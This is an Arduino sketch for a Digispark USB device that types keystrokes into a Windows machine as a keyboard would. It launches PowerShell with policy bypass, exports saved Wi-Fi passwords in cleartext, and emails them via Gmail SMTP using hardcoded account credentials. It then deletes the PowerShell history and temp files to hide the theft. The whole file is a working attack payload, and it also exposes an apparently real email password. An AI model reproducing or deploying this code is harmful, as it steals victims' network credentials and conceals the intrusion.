#include "DigiKeyboardPtBr.h"
char mode[] = "powershell -nop -exec bypass";
char separator[] = "read-host";
void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(mode);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.println("cd $env:temp");
  DigiKeyboard.delay(1000);
  DigiKeyboardPtBr.println("netsh wlan export profile key=clear");
  DigiKeyboard.delay(1000);
  DigiKeyboardPtBr.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > temp.csv");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  //from email address:
  DigiKeyboardPtBr.print(F("$email = \"digisparkteste80@gmail.com\";"));
  //to email address
  DigiKeyboardPtBr.print(F("$addressee = \"silvestrelago97@gmail.com\";"));
  // o lugar onde vai salvar as senhas
  DigiKeyboardPtBr.print(F("$tempcsv = \"$env:temp\\temp.csv\";"));
  // senha da sua conta
  DigiKeyboardPtBr.print(F("$pass = \"aewipbqbauetkeiz\";"));
  DigiKeyboardPtBr.print(F("$smtpServer = \"smtp.gmail.com\";"));
  DigiKeyboardPtBr.print(F("$port = \"587\";"));
  

  
  DigiKeyboardPtBr.print(F("$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;"));
  DigiKeyboardPtBr.print(F("$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;"));
  DigiKeyboardPtBr.print(F("$msg = new-object Net.Mail.MailMessage;"));
  DigiKeyboardPtBr.print(F("$smtp = new-object Net.Mail.SmtpClient($smtpServer, $port);"));
  DigiKeyboardPtBr.print(F("$smtp.EnableSsl = $true;"));
  DigiKeyboardPtBr.print(F("$msg.From = \"$email\";"));
  DigiKeyboardPtBr.print(F("$msg.To.Add(\"$addressee\");"));
  DigiKeyboardPtBr.print(F("$msg.Attachments.Add(\"$tempcsv\");"));
  DigiKeyboardPtBr.print(F("$msg.BodyEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboardPtBr.print(F("$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboardPtBr.print(F("$msg.IsBodyHTML = $true ;"));
  DigiKeyboardPtBr.print(F("$msg.Subject = \"Senhas WIFI\";"));
  DigiKeyboardPtBr.print(F("$msg.Body = \"<h2> Aqui as suas senhas </h2></br>olha o arquivo...\"; "));
  DigiKeyboardPtBr.print(F("$SMTP.Credentials = $cred;"));
  DigiKeyboardPtBr.print(F("$smtp.Send($msg);"));
  DigiKeyboardPtBr.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(separator);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(mode);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.print(F("del (Get-PSReadlineOption).HistorySavePath;"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.print(F("rm \"$env:temp\\Wi*.xml\""));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.print(F("rm \"$env:temp\\temp.csv\""));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.print("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(separator);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}



void loop() {
  
}
